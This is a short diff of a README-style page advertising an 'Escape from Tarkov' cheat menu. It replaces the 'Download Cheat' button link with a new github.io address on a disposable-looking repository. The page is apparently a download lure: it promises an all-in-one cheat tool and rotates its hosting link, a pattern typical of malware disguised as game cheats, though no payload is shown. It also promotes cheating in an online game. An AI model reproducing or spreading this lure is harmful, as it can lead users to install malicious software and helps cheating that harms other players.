@@ -4,7 +4,7 @@ Let’s face it — *Escape from Tarkov* isn’t just hard... it’s punishing. 
 
 No need to run multiple sketchy tools — this cheat menu has **everything you need in one place**. Toggle, customize, dominate. Simple as that.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload13.bitbucket.io)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://EFT-Cheat-Menu-difu7.github.io/.github)
 ---
 
 ## 🧰 What’s Inside the Cheat Menu?
